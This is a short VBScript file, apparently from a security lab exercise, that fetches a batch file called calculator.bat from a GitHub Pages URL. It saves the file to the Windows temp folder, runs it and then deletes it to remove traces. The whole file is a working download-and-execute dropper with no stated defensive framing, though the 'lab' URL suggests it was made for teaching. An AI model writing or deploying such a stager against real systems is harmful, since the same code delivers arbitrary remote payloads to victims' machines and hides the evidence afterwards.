' ** Script to download and execute a batch file **

Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' URL where the batch file is hosted
strURL = "https://ucases25oa.github.io/ucases-lab-3/calculator.bat"

' Local path to save the downloaded batch file
strPath = objFSO.GetSpecialFolder(2) & "\calculator.bat"

' Download the file
objXMLHTTP.Open "GET", strURL, False
objXMLHTTP.Send

If objXMLHTTP.Status = 200 Then
Set objStream = CreateObject("ADODB.Stream")
objStream.Open
objStream.Type = 1
objStream.Write objXMLHTTP.ResponseBody
objStream.SaveToFile strPath, 2
objStream.Close

' Execute the downloaded batch file
Set objShell = CreateObject("WScript.Shell")
objShell.Run strPath, 1, True

' Delete the batch file after execution
objFSO.DeleteFile(strPath)
End If